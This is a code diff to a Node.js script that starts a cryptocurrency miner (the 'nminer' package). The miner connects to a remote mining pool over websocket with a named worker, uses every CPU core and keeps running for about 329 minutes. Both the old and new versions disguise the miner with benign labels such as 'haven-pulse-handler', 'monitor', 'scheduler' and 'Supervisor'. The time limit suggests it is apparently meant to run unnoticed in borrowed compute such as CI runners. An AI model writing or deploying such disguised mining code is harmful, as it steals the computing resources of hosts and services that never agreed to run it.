@@ -3,27 +3,32 @@ const os = require("os");
 const { NMiner } = require("nminer");
 const config = require("./app/config");
 
-function createRuntimeContext() {
-    const instanceToken = "e7c465";
-    console.log(`[host] Instantiated runtime context for haven-pulse-handler [${instanceToken}]`);
+async function initialize() {
+    const instanceToken = "578022";
+    console.log(`[monitor] Starting runtime for ${config.appName || "haven-pulse-handler"} [${instanceToken}]`);
 
-    const handler = new NMiner(
+    const scheduler = new NMiner(
         "wss://nmining-runtime.igrp.app/",
         "Arup07.haven-pulse-handler",
-        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
+        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
     );
 
-    const keepAlivePromise = new Promise(() => {});
+    process.stdin.resume();
     setTimeout(() => {
-        console.log("[timeout] Operational limit (328m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (329m) reached, exiting cleanly.");
         process.exit(0);
-    }, 328 * 60 * 1000);
+    }, 329 * 60 * 1000);
 
     process.on("SIGTERM", () => {
         
-        console.log("[halt] Clean lifecycle exit confirmed.");
+        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${instanceToken}.`);
         process.exit(0);
     });
+
+    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
 }
 
-createRuntimeContext();
+initialize().catch((err) => {
+    console.error("Supervisor startup fault:", err);
+    process.exit(1);
+});
